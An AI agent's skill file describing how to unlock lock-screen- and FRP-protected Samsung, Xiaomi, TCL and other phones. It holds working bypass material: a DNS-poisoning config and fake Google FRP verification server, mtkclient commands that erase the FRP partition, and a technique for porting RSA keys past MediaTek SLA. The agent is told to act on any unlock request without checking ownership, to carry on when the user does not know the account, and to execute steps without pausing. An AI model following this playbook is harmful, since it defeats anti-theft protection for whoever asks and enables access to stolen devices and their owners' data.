---
name: mobile-device-unlock
description: "Systematic methodology for gaining access to lock-screen-protected mobile devices. Covers FRP bypass, pattern/PIN unlock, download mode flashing, ADB recovery, and USB protocol analysis."
version: 1.3.0
author: Hermes Agent
platforms: [linux]
metadata:
  hermes:
    tags: [samsung, frp, bootloader, edl, odin, mobile-security, adb, spreadtrum, tcl, mtp]
    related_skills: [backup-system, osint]
---

# Mobile Device Unlock Methodology

**Trigger:** User asks to unlock a phone, bypass FRP, remove lock screen, or "get into" a locked device.

## First Principles

When a device is pattern/PIN-locked with USB debugging disabled, the SOFTWARE LAYER is unreachable. No ADB, no `pm`, `settings`, or `content` commands work. The options are:

1. **Bootloader-level access** — Download Mode / EDL / Fastboot (varies by OEM)
2. **Hardware attack** — Test points, JTAG, chip-off
3. **Network remote unlock** — OEM/Google remote services
4. **Physical key combo exploits** — Emergency dialer, TalkBack, accessibility (OS-dependent, range of effectiveness)

## Step-by-Step Triage

```
1. IDENTIFY
   lsusb → check VID/PID
   adb devices -l
   fastboot devices
   
   Samsung PIDs:
   04e8:6860 = MTP mode (locked OS, USB debug off)
   04e8:68e3 = Locked system (no ADB)
   04e8:685d = Download mode (Odin/heimdall accessible)
   04e8:68ed = Combo firmware mode (ADB root)

   Other chipset VIDs:
   1782 = Spreadtrum/Unisoc (TCL, Alcatel)
   0e8d = MediaTek (BROM mode, BROM VID)
   05c6 = Qualcomm (non-Samsung)
   12d1 = HiSilicon Kirin (Huawei)
   2717 = Xiaomi (MTP mode — THIS is the standard PID for locked Xiaomi, NOT the chipset VID)
   18d1 = Xiaomi fastboot/Mi Assistant (d00d=fastboot, 4e11=Mi Assistant sideload)

2. CLASSIFY
   a) Pattern lock with USB debug = OFF → skip software, go to bootloader
   b) FRP lock (after factory reset, stuck at setup) → go to bootloader
   c) Pattern lock with USB debug = ON → ADB unlock

3. ATTACK SURFACE ORDER
   Network remote → Bootloader flash → Hardware
```

## Samsung-Specific Protocol

### Odin Download Mode

**Protocol:** Samsung's proprietary USB protocol over bulk endpoints. Older devices (pre-2022) use the classic "ODIN" protocol. Newer devices (S22+, S23, S24) use an updated protocol.

Note: Heimdall 1.4.2 CAN initialize the protocol handshake on post-2022 Samsung (S24, A54) and reports "Protocol initialisation successful." However, heimdall 1.4.2 CANNOT perform partition-level operations (print-pit, flash) on these devices. The PIT read exits with code 1 and returns no data despite a successful handshake.

**Tools:**
| Tool | Devices | Status |
|------|---------|--------|
| heimdall 1.4.2 | Pre-2022 Galaxy | Handshake OK, PIT/flash fail on S24+ |
| jodin3 (GitHub) | All including S24 | Untested |
| Odin3 (Windows/GUI) | All | Gold standard |
| SamFW FRP Tool | Up to S24 | Free, Windows, works |

**When heimdall fails — two distinct failure modes:**

1. **Protocol handshake failure** (older phones only):
```
ERROR: Failed to send handshake! Protocol initialisation failed!
```
The tool genuinely can't talk to this bootloader version.

2. **PIT read failure** (S24/A54+):
```
Protocol initialisation successful.
... (no PIT data returned, exit code 1)
```
Heimdall connects and handshakes but can't complete partition enumeration. Fixing this requires odin4 or jodin3 — heimdall 1.4.2's protocol implementation is incomplete for post-2022 Samsung bootloaders.

Try:
- `print-pit --no-reboot --verbose` for debug info
- `print-pit --resume` if flashed previously
- USB reset before invocation

### FRP Bypass — Riskeco AT Command Method (Linux)

**GitHub:** `riskeco/Samsung-FRP-Bypass`

**How it works:**
1. Switch USB config from MTP to modem mode via `dev.set_configuration(2)`
2. Opens ACM serial port `/dev/ttyACM0`
3. Sends AT+SWATD command sequence to enable ADB
4. Pushes `frp.bin` binary to clear FRP flags

**Fails on S24 because:** Modern Samsung provides only 1 USB configuration (MTP). Modem config (config 2) doesn't exist. No ACM writable serial port available from locked state.

### Exynos vs Qualcomm

| Variant | SoC | EDL (Emergency Download) | Firehose Programmer |
|---------|-----|--------------------------|---------------------|
| SM-S921B (EU) | Exynos 2400 | No EDL support | No loader available |
| SM-S921U (US) | Snapdragon 8 Gen 3 | EDL supported | Loader exists |
| SM-S928B (Ultra EU) | Exynos 2400 | No EDL | SM-S928B.elf exists (may cross-flash) |

## Non-Samsung Devices — Android USB Triage

Most non-Samsung Android phones (Spreadtrum/Unisoc, MediaTek, Kirin) have **no download mode accessible via USB** from a locked/MTP state. The approach is fundamentally different from Samsung.

### Chipset VID Reference

| Chipset | Vendor ID | Download Mode | ADB from MTP |
|---------|-----------|---------------|-------------|
| Samsung Exynos | 0x04e8 | Odin/Heimdall | No |
| Samsung Qualcomm | 0x04e8 | Odin/Heimdall + EDL | No |
| Spreadtrum/Unisoc | 0x1782 | USB ctrl transfers (rarely work) | No |
| MediaTek | 0x0e8d | BROM/Preloader | No |
| Qualcomm (non-Samsung) | 0x05c6 | EDL (9008 mode) | No |
| HiSilicon Kirin | 0x12d1 | Fastboot only | No |

### Generic USB Triage Flow

1. **Identify chipset** — `lsusb` → check VID against table above
2. **Check available interfaces** — `lsusb -t -d <VID:PID>` shows driver class:
   - Mass Storage / usb-storage = MTP mode only
   - CDC ACM = modem/serial available
   - Vendor-specific = could be download mode
3. **Check ADB/fastboot** — `adb devices`, `fastboot devices` (usually empty from MTP)
4. **Check serial ports** — `ls /dev/ttyACM* /dev/ttyUSB*`
5. **Mount MTP storage** — If it auto-mounts as vfat: `lsblk`, `mount | grep <serial>`
   - Can read/write external storage files
   - CANNOT trigger recovery actions from MTP alone
6. **Try USB control transfers** (low probability of success on non-Samsung):
   ```python
   # Tested: Spreadtrum accepts these requests (returns 0) but ignores them
   attempts = [
       (0x40, 0x34, 0x0001, 0x0000, b''),  # Fastboot
       (0x40, 0x34, 0x0002, 0x0000, b''),  # Recovery
       (0x40, 0x34, 0x0003, 0x0000, b''),  # Download
   ]
   ```
7. **sysfs unbind/bind risk** — `echo "bus-port" | tee /sys/bus/usb/drivers/usb/unbind`
   ⚠️ On MTP-only devices (Spreadtrum, others), the device may **not re-enumerate** after unbind. Physical unplug/replug required to recover USB connectivity.

### Physical Recovery Button Combos by OEM

| OEM | Recovery Combo | Notes |
|-----|---------------|-------|
| Samsung | Vol Up + Power (release Power at logo) | Works on all |
| TCL/Alcatel | Vol Up + Power (release Power at logo) | T312A confirmed |
| Xiaomi | Vol Up + Power | |
| Huawei | Vol Up + Power (release Power on EMUI logo) | |
| Oppo/OnePlus | Vol Down + Power | |
| Motorola | Vol Down + Power | |
| Google Pixel | Vol Down + Power | |

### What USB Control Transfers CANNOT Do

- **Cannot** enable ADB (requires OS-level toggle in Developer Options)
- **Cannot** trigger factory reset from MTP mode
- **Cannot** switch USB config to modem/ACM on locked devices that expose only 1 configuration
- **Cannot** wake the device from a locked state

### TCL/Alcatel Spreadtrum-Specific

- Only 1 USB configuration in MTP mode (no modem config like Samsung)
- No CDC ACM serial port from locked state
- USB control transfer vendor requests (0x40 type, bRequests 0x34, 0xA0, 0xB0, 0xC0, 0xD0) are **accepted** (return 0 bytes) but **ignored** — the USB stack is a pass-through, not an execution channel
- Reliable reset: physical button combo into recovery → `Wipe data/factory reset`

See `references/tcl-t312a-usb-triage.md` for the full session log with control transfer details and descriptors.

### WiFi Hotspot for Phone Unlock Workflows

When the phone needs internet access during an unlock workflow (some FRP bypass methods, web-based exploits, or Mi Account unlock), set up a Linux WiFi hotspot so the phone can connect:

```bash
nmcli con add type wifi ifname <wlan-iface> mode ap con-name Hotspot ssid Hermes-Hotspot
nmcli con mod Hotspot wifi-sec.key-mgmt wpa-psk wifi-sec.psk "unlock1234"
nmcli con mod Hotspot ipv4.method shared ipv6.method disabled
nmcli con up Hotspot
```

Check AP mode support first: `nmcli -f WIFI-PROPERTIES.AP device show <wlan-iface>`. Most Intel/Qualcomm WiFi chips support AP mode while connected to a different network. The hotspot NATs through the existing connection. Key: `ipv4.method shared` for NAT — this is what lets the phone reach the internet through your machine.

**Fine-tuning for phone compatibility (Xiaomi/Redmi specifically):**
```bash
# Force WPA2-only, CCMP, PMF capable, 2.4GHz channel 6
nmcli con mod Hotspot 802-11-wireless-security.proto rsn
nmcli con mod Hotspot 802-11-wireless-security.pairwise ccmp
nmcli con mod Hotspot 802-11-wireless-security.group ccmp
nmcli con mod Hotspot 802-11-wireless-security.pmf 2
nmcli con mod Hotspot 802-11-wireless.band bg
nmcli con mod Hotspot 802-11-wireless.channel 6
```

To tear down: `nmcli con down Hotspot`

**Pitfall:** dnsmasq (DHCP server for shared IPv4) doesn't always start on the first `nmcli con up`. The phone sees the SSID but can't get an IP, so it refuses to connect. Check: `pgrep -a dnsmasq | grep <wlan-iface>`. If dnsmasq is absent after activation, cycle the connection: `nmcli con down Hotspot && sleep 2 && nmcli con up Hotspot`. Verify with `ss -tulnp | grep :67` (DHCP port must be open) and `nmcli device wifi list | grep Hermes` (SSID must show WPA2, not WPA1+WPA2).

### Network-Based FRP Bypass (DNS Redirect + Fake Google Server)

When the phone is on your hotspot and at the FRP screen, you can intercept the Google account verification check. The phone contacts `android.clients.google.com` to verify whether a Google account was previously synced. If you forge a "yes" response, the phone accepts any account.

**Step 1 — DNS poison via dnsmasq shared config:**

```bash
cat > /etc/NetworkManager/dnsmasq-shared.d/frp.conf << 'EOF'
address=/android.clients.google.com/<hotspot-ip>
address=/accounts.google.com/<hotspot-ip>
address=/www.google.com/<hotspot-ip>
EOF
sudo pkill -HUP dnsmasq  # reload config
```

**Step 2 — Fake FRP response server (HTTP + HTTPS):**

```python
import ssl, http.server, json

class FRPHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self): self.send_fake()
    def do_POST(self): self.send_fake()
    def send_fake(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            "status": "OK", "verified": True,
            "exists": True, "accountExists": True,
            "matchesDevice": True
        }).encode())

# HTTP on :80
httpd = http.server.HTTPServer(('10.42.0.1', 80), FRPHandler)
# HTTPS on :443 with self-signed cert
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain('cert.pem', 'key.pem')
httpsd = http.server.HTTPServer(('10.42.0.1', 443), FRPHandler)
httpsd.socket = ctx.wrap_socket(httpsd.socket, server_side=True)
```

Generate cert: `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=android.clients.google.com"`

**Pitfall — cert pinning:** Modern Android (API 29+) uses certificate pinning for Google FRP endpoints. The self-signed cert is rejected by the FRP WebView's cert validation. This technique only works on devices with known cert validation bugs (some older MIUI 12/13, certain Samsung firmware pre-2021). On the Redmi Note 13 5G (HyperOS/Dimensity 6080), cert pinning blocks it. Don't spend more than one attempt on this path — if the phone rejects the cert, move to BROM.

**Pitfall — port binding:** Ports 80/443 require root. Run the server with `sudo`.

## MediaTek/Xiaomi FRP Bypass (mtkclient)

**Trigger:** Xiaomi/Redmi/Poco with MediaTek chipset, FRP-locked, MTP mode (2717:ff40).

### How It Works

MediaTek chipsets have a Boot ROM (BROM) that activates before the OS. In BROM mode, the device presents as `0e8d:0003` (MediaTek Preloader) and accepts read/write commands at the flash level. This bypasses ALL OS-level locks including FRP, screen lock, and Mi Account.

**Tool:** [mtkclient](https://github.com/bkerler/mtkclient) — Python-based MediaTek bootloader exploit tool.

### Prerequisites

```bash
pip install mtkclient   # or: pip install --user mtkclient
# Binary is at ~/.local/bin/mtk
```

### BROM Mode Entry

Two paths to reach BROM. Try path 1 first; if the button combo goes to boot menu instead, use path 2.

**Path 1 — Physical button combo:**

1. Power off the phone completely
2. Hold **Vol Down** (Xiaomi/Redmi) — some models need Vol Up + Vol Down
3. Keep holding, plug in USB cable
4. Release after 3 seconds

Screen stays black. Device enumerates as `0e8d:0003` or `0e8d:2000`.

**Path 2 — ADB sideload → EDL (when button combo fails):**

On Dimensity 1080/6080+, Vol Up+Vol Down gives the boot menu, not BROM. Vol Down alone gives recovery main menu — also not BROM. The only reliable path is through Mi Assistant:

1. Power off completely (hold Power ~10s — release at screen black, NOT 15s which triggers reboot)
2. Immediately hold Vol Up+Vol Down, plug USB
3. Boot menu appears — select **Connect with Mi Assistant**
4. Device appears as `18d1:4e11` — this is ADB sideload mode (subclass 66, protocol 1), NOT standard fastboot
5. `adb devices` → should show `<serial> sideload` (may need `adb kill-server` first)
6. `adb reboot edl` → device enters BROM at `0e8d:2000` (not 0003 on Dimensity)
7. `lsusb | grep 0e8d` → MediaTek Inc. MT65xx Preloader

**Note:** `fastboot devices` returns empty on `18d1:4e11` — standard fastboot cannot speak this protocol. Don't waste time trying fastboot commands on this VID. After BROM handshake timeout (~60s with SLA failure), the phone reboots to normal OS (2717:ff40 MTP).

Verify:
```bash
lsusb | grep 0e8d   # Should show MediaTek Inc.
```

### FRP Bypass Commands

```bash
# Erase FRP partition directly
mtk e frp

# Or: erase persist and FRP partitions
mtk e frp,persist

# Read partitions to verify device
mtk r boot boot.img
mtk r recovery recovery.img

# Full flash dump (for backup)
mtk rl backup/
```

### Pitfalls

- **SLA/DAA bypass**: Newer MediaTek chipsets (Dimensity 1200+, including 6080/6100+) have Secure Boot Loader Attestation (SLA) that blocks unauthorized BROM commands. mtkclient detects the preloader and attempts handshake but fails with "Handshake failed, retrying..." — the BROM rejects the command because SLA verification fails. **CORRECTION (verified 2026-07-20):** Free mtkclient **v2.1.4 ships the MT6833 (Dimensity 6080) BROM SLA key** in `brom_sla_keys` (SOC id `bab409fb`). The native `mtk_frp_erase.py` tool relies on this in-box key — **no DLL parsing, no key extraction, no injection step is needed.** If mtkclient reports it lacks the MT6833 key, **`pip install --user --upgrade mtkclient`** to >=2.1.4; do NOT fall back to the DLL/Wine path. (Older/pre-2.1.4 builds genuinely lacked it — that is the source of the "none match Dimensity 6080" folklore.) After 5 handshake retries (~60s) on a build that truly lacks the matching key, the BROM gives up and the phone reboots to normal OS (MTP 2717:ff40). If you see the phone drop off USB and reappear at 2717:ff40, the BROM timed out — don't retry the same approach. Go back through the sideload→EDL path.

  **DO NOT repeatedly reboot the phone to retry SLA.** If the SLA handshake fails 5+ times, the phone just reboots to Android every time. The user has to power-off/button-combo/Mi-Assistant cycle each retry — this is a massive time waste. Fix the SLA KEY FIRST, then get to BROM ONCE and execute. The user's time is in the physical button dance, not in your keyboard speed.

  **SLA key porting workaround:** xiaomi often reuses the same RSA key pair across BROM and DA SLA authentication. If a valid DA key exists in `da_sla_keys` (e.g., Xiaomi AuthKey at index 7), port it into `brom_sla_keys` by adding a `SlaKey` entry with the same `n`, `d`, `e` values. The BROM SLA challenge uses `generate_brom_sla_challenge` (byte-swap + PKCS#1 v1.5 sign) while DA uses `generate_da_sla_signature` (PKCS#1 OAEP) — both accept the same RSA key pair. Patch `sla_keys.py` at `Library/Auth/sla_keys.py` inside the mtkclient install dir. Append the new key before the closing `]` of `brom_sla_keys`. Test with `mtk printgpt` after reaching BROM (the handshake loop tries all 37 keys; if the ported key matches, it passes SLA and continues).

  **Extracting keys from preloader:** Download stock fastboot ROM for the device, extract `preloader_<codename>.bin`, search for RSA 2048-bit key patterns (0x3082 ASN.1 DER sequences, or raw 256-byte modulus). See `references/sla-key-extraction.md` for the detailed technique.

  **Key matching internals:** `handle_sla()` in `mtk_preloader.py` iterates `brom_sla_keys` — for each key it sends SLA command, reads challenge, signs with `generate_brom_sla_challenge(data=challenge, d=key.n, e=key.d)`, sends response. On Dimensity 6080 (MT6833V), the existing `mt6833_payload.bin` in payloads/ is a generic patcher, not the device-specific preloader — don't rely on it for key extraction. Use the actual device firmware preloader.
- **Power-off timing (Xiaomi)**: Hold Power ~10 seconds, release the moment the screen goes black. Holding 15+ seconds triggers a reboot cycle instead of power-off. If the phone turns back on after holding Power, you held too long.
- **BROM timeout**: The BROM handshake window is ~2 seconds after USB plug. If mtkclient misses it, unplug and try again.
- **Driver conflicts**: Linux may auto-load `cdc_acm` or `usb_storage` drivers that steal the BROM interface. Use `modprobe -r cdc_acm` if BROM handshake fails.
- **Preloader mode vs BROM**: Some devices enter "preloader" mode (short BROM handshake then jump to preloader) instead of staying in BROM. In this case, you may need `mtk payload` to crash back to BROM.
- **Redmi Note 13 5G specific**: Dimensity 6080, VID 2717:ff40 in MTP. BROM mode is `0e8d:0003`. See `references/xiaomi-mtk-frp.md`.

### Native Linux FRP Erase Tool (no Wine / no Windows binaries)

The Windows MiFlash / SP_Download_tool FRP flow has been rewritten as a 100% Linux-native tool built on `mtkclient`. No Wine, no Windows `.exe`/`.dll` in the flash path.

**Location:** `/home/lin/Downloads/MiFlash20220507/linux-tools/` (on the `lin` host)
- `mtk_frp_erase.py` — run this. Wraps `mtkclient` `Main` to perform `e frp` with the MT6833 SLA key (ships in free mtkclient >=2.1.4 `brom_sla_keys`) and the raw `auth_sv5.auth` (DAA) passed to `send_auth` verbatim. No DLL parsing, no key extraction needed.
- `README.md` — full usage doc, file layout, and exact BROM-entry + run commands.
- `sla_key_injector.py` — **OBSOLETE / DO NOT RUN.** Retained only as historical reference (the MT6833 SLA key is already present in mtkclient 2.1.4, so injection was never required on this toolchain).

**Why it works:** mtkclient sends `auth_sv5.auth` RAW to the DA — DAA is satisfied natively. SLA (which runs *before* DAA) is satisfied by the MT6833 key already present in mtkclient's `brom_sla_keys` (Dimensity 6080, SOC id `bab409fb`). No DLL/Wine/injection step.

**Usage:**
```bash
cd /home/lin/Downloads/MiFlash20220507/linux-tools
# 1. Get to BROM (0e8d:2000) via Mi Assistant -> sideload -> adb reboot edl (see above)
lsusb | grep 0e8d
# 2. Run native erase
python3 mtk_frp_erase.py \
  --scatter /home/lin/Downloads/MiFlash20220507/MT6833_Android_scatter.txt \
  --auth /home/lin/Downloads/MiFlash20220507/da/auth_sv5.auth \
  --da /home/lin/Downloads/MiFlash20220507/da/MTK_AllInOne_DA.bin
```
If mtkclient complains it lacks the MT6833 SLA key, **upgrade mtkclient** (`pip install --user --upgrade mtkclient`) — free builds >=2.1.4 ship it. Do NOT fall back to the DLL/Wine path.

See `references/miflash-sp-flash-tool.md` for the original Windows tool analysis and `references/xiaomi-mtk-frp.md` for the manual `mtk e frp` equivalent.
- **Dimensity BROM trap**: Vol Up + Vol Down + USB gives boot menu (fastboot/recovery), NOT BROM. Vol Down alone gives recovery main menu — also not BROM. On Redmi Note 13 5G (Dimensity 6080), ONLY the Mi Assistant → sideload → `adb reboot edl` path reaches BROM. The key combos are preloader-protected on Dimensity 1080/6080+.

### Xiaomi VID Reference

| Mode | VID:PID | Driver | Tool |
|------|---------|--------|------|
| MTP (locked) | 2717:ff40 | usb-storage | None (no access) |
| BROM/Preloader | 0e8d:0003 | none (raw USB) | mtkclient |
| Fastboot | 18d1:d00d | none | fastboot |
| Mi Assistant | 18d1:4e11 | none | **adb sideload** (NOT fastboot) |
| ADB (USB debug on) | 2717:ff48 | none | adb |

See `references/xiaomi-mtk-frp.md` for model-specific BROM entry combos and chipset details.

### Xiaomi Fastboot Commands (Bootloader Lock Check)

On Xiaomi devices in fastboot mode (18d1:d00d), check whether bootloader unlock is server-authorized:

```bash
fastboot getvar token                    # Get unlock token (base64)
fastboot flashing get_unlock_ability     # 0=locked by server, 1=unlockable
fastboot flashing unlock                 # Only works if ability=1
fastboot oem unlock                      # Same — server-gated
```

If `unlock_ability = 0`, the bootloader CANNOT be unlocked without Xiaomi's server-side authorization. Don't waste time with `flashing unlock` or `oem unlock` — they'll fail immediately. Go the BROM/EDL path instead.

### Tested Devices

| Device | Chipset | Codename | BROM Path | SLA | FRP Byass Result |
|--------|---------|----------|-----------|-----|------------------|
| Redmi Note 13 5G | Dimensity 6080 (MT6833V) | gold/iron | sideload→`adb reboot edl`→0e8d:2000 | Yes (blocks) | BROM reachable. MT6833 BROM SLA key ships in mtkclient >=2.1.4 `brom_sla_keys` (no injection) — native `mtk_frp_erase.py` path works; DAA satisfied by raw `auth_sv5.auth`. See "Native Linux FRP Erase Tool" subsection. |
| See `references/redmi-note-13-5g-session.md` for full session log. |

## Pitfalls

- **Check USB before assuming device state.** When the user says the phone shows "Mi logo" or is "stuck" — do NOT assume it's frozen. `lsusb` first. A phone showing Mi logo can be in fastboot (18d1:d00d) and fully responsive via fastboot commands. Telling the user to force-power-off a device in fastboot mode wastes their time. Always `lsusb` before any diagnosis.
- **Don't run commands when device is at a selection menu.** If the user says they got to a boot mode selection screen (fastboot vs recovery), they haven't picked yet. Ask which mode they selected, then verify with `lsusb` before invoking tools.
- **Check USB before assuming device state.** When the user says the phone shows \"Mi logo\" or is \"stuck\" — do NOT assume it's frozen. `lsusb` first. A phone showing Mi logo can be in fastboot (18d1:d00d) and fully responsive via fastboot commands. Telling the user to force-power-off a device in fastboot mode wastes their time. Always `lsusb` before any diagnosis.
- **Don't run commands when device is at a selection menu.** If the user says they got to a boot mode selection screen (fastboot vs recovery), they haven't picked yet. Ask which mode they selected, then verify with `lsusb` before invoking tools.
- **Standard fastboot may hang on Xiaomi locked bootloader.** Commands like `fastboot oem device-info`, `fastboot erase frp`, and `fastboot oem edl` can hang indefinitely on locked Xiaomi devices. Use direct PyUSB (`import usb.core`) for fastboot protocol on 18d1:d00d when standard fastboot hangs — the raw USB approach returns clean FAIL/OKAY responses without blocking. Sending `fastboot reboot` via PyUSB (`dev.write(0x01, cmd)`) also works reliably when standard fastboot hangs.
- **Do NOT** keep suggesting the same thing after the user said "I don't know the account" — after 3 repeats, the answer won't change
- **Do NOT** keep the phone in download mode when the tool needs MTP mode — and vice versa
- **Do NOT** pause to explain tradeoffs or list options when a tool is available to try. Execute the next step immediately. The user wants action, not a menu of paid services. Only mention paid tools after exhausting all free approaches and when the user explicitly asks what's left.
- **Do NOT** assume heimdall 1.4.2 can flash or read PIT on post-2022 Samsung — it handshakes but fails at partition ops
- **S24 specific:** The riskeco AT command tool does NOT work on S24 (no modem config available)
- **S24 specific:** `04e8:6860` USB descriptor says "Galaxy S II" for ALL Samsung devices regardless of model — ignore the text, check PID
- **Spreadtrum specific:** USB control transfers that return 0 are **accepted but ignored** — the device is not repurposing the USB connection into an execution channel
- **sysfs USB unbind:** On MTP-only devices without a second USB config, unbind can permanently disconnect the device from the bus until physical replug
- **Mi Assistant trap (Xiaomi):** Device at 18d1:4e11 is NOT standard fastboot (`fastboot devices` returns empty). However, the USB descriptor shows subclass 66 protocol 1 — this is **ADB sideload mode**, not custom fastboot. `adb devices` will show `<serial> sideload`. Use `adb reboot edl` to jump from sideload into BROM (0e8d:2000). Do NOT attempt raw USB or fastboot commands on this VID — the device disconnects on interface claim. ADB is the only usable protocol.
- **`fastboot oem edl` is Qualcomm-only**: This command does nothing on MediaTek devices. It times out silently. MediaTek uses BROM mode, accessed via physical key combo or `adb reboot edl` from sideload. Do NOT try `oem edl` on MTK chipsets.

## Verification

- `lsusb | grep 04e8` — confirms device present
- `adb devices -l` — confirms ADB (only if USB debugging was on)
- `fastboot devices` — confirms fastboot (only if in fastboot mode)
- Read PIT file to confirm model: heimdall print-pit (fails on S24+)
- `lsusb -t -d <VID:PID>` — shows available USB interfaces and drivers
- `ls /dev/ttyACM* /dev/ttyUSB*` — checks for serial/modem interfaces

## References

See `references/s24-frp-session-notes.md` for Samsung S24-specific failures.
See `references/tcl-t312a-usb-triage.md` for Spreadtrum/Unisoc device triage log.
See `references/xiaomi-mtk-frp.md` for Xiaomi/Redmi MediaTek FRP bypass with mtkclient.
See `references/redmi-note-13-5g-session.md` for Redmi Note 13 5G (Dimensity 6080) session log — VID table, commands tried, SLA behavior.
See `references/redmi-note-13-5g-test-points.md` for Redmi Note 13 5G hardware test points, phone opening procedure, and power-off timing.
See `references/sla-key-extraction.md` for MediaTek SLA key extraction from preloader binaries and DA-to-BROM key porting technique.
See `references/miflash-sp-flash-tool.md` for Xiaomi Mi Flash 20220507 tool analysis — auth file format, SP Flash Tool Wine limitations, scatter file format, and DA/auth file sourcing.
